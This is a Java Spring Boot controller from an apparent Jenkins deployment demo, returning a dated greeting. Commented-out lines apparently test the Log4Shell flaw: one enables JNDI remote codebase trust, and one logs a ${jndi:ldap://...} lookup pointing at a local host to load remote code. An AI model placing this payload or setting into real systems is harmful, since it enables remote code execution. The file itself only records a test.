package com.qingteng.mavenwithdocker;

//import com.fishpro.helloworld.service.MyService;  // 用于演示多模块
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import java.util.Date;
import java.text.SimpleDateFormat;

//import log4j2
//import org.apache.logging.log4j.LogManager;
//import org.apache.logging.log4j.Logger;
//import org.apache.logging.log4j.util.PropertiesUtil;

/**
 * helloword示例
 * 
 * <pre>
 *     class 上方的 @RequestMapping("/hello") 表示类的路由，即类下所有方法上的路由都是在此路由下面（url）
 * </pre>
 */
@RequestMapping("/hello")
@RestController
public class IndexController {
	// 下面代码是演示 多模块使用 在 pom.xml 中开启
	//  @Autowired
	//  MyService myService;
	@GetMapping("/say")
	public String say() {
		// Demo log4j2
		//System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		//LogManager.getLogger().info("java version = ${java:version}, os=${java:os}");
		//LogManager.getLogger().info("${jndi:ldap://192.168.8.1:8899/Log4jRCE}");
		
		// return "Hello World, adrain";
		//return "the log4j formatmsgnolookups is: " + PropertiesUtil.getProperties().getBooleanProperty("log4j2.formatMsgNoLookups");
		return "hello jenkins, auto pull from github v11 by " + new SimpleDateFormat("dd-MM-yyyy").format(new Date());
		/**
		 * 下面代码是演示 多模块使用 在 pom.xml 中开启 <dependency>
		 * <groupId>com.fishpro.helloworld</groupId> <artifactId>service</artifactId>
		 * <version>0.0.1-SNAPSHOT</version> </dependency>
		 */
//      return  myService.message();
	}

}

